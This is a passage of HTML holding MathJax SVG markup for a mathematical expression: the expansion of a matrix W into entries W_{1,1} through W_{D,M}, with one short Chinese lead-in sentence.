transform=\"translate(2182.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3238.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(345,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(623,0)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g></g></g></svg></mjx-container></span></p>\n<p>直观的看，W的展开为： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -6.314ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"44.754ex\" height=\"13.759ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -3290.8 19781.4 6081.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1325.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mrow\" transform=\"translate(2381.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"23A1\" d=\"M319 -645V1154H666V1070H403V-645H319Z\" transform=\"translate(0,2136.8)\"/><path data-c=\"23A3\" d=\"M319 -644V1155H403V-560H666V-644H319Z\" transform=\"translate(0,-2146.8)\"/><svg width=\"667\" height=\"2683.5\" y=\"-1091.8\" x=\"0\" viewbox=\"0 670.9 667 2683.5\"><path data-c=\"23A2\" d=\"M319 0V602H403V0H319Z\" transform=\"scale(1,6.687)\"/></svg></g><g data-mml-node=\"mtable\" transform=\"translate(667,0)\"><g data-mml-node=\"mtr\" transform=\"translate(0,2540.8)\"><g data-mml-node=\"mtd\" transform=\"translate(116,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(3278.6,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6380.2,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(8723.2,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,1103.6)\"><g data-mml-node=\"mtd\" transform=\"translate(116,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(3278.6,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(778,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6380.2,0)\"><g data-mml-node=\"mo\"><path data-c=\"22EF\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(8723.2,0)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(500,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(778,0)\"><path data-c=\"1D440\" d=\"M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z\"/></g></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-1103.6)\"><g data-mml-node=\"mtd\" transform=\"translate(942.3,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(4104.9,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g><g data-mml-node=\"mtd\" transform=\"translate(6325.2,0)\"><g data-mml-node=\"mo\"><path data-c=\"22F1\" d=\"M133 760Q133 784 150 802T193 820Q217 820 235 804T254 761Q254 736 237 718T194 700T151 717T133 760ZM580 460Q580 484 597 502T640 520Q664 520 682 504T701 461Q701 436 684 418T641 400T598 417T580 460ZM1027 160Q1027 184 1044 202T1087 220Q1111 220 1129 204T1148 161Q1148 136 1131 118T1088 100T1045 117T1027 160Z\"/></g></g><g data-mml-node=\"mtd\" transform=\"translate(9744.3,0)\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mo\"><path data-c=\"22EE\" d=\"M78 30Q78 54 95 72T138 90Q162 90 180 74T199 31Q199 6 182 -12T139 -30T96 -13T78 30ZM78 440Q78 464 95 482T138 500Q162 500 180 484T199 441Q199 416 182 398T139 380T96 397T78 440ZM78 840Q78 864 95 882T138 900Q162 900 180 884T199 841Q199 816 182 798T139 780T96 797T78 840Z\"/></g></g></g></g><g data-mml-node=\"mtr\" transform=\"translate(0,-2503.6)\"><g data-mml-node=\"mtd\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(977,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"1D437\" d=\"M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(828,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1106,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 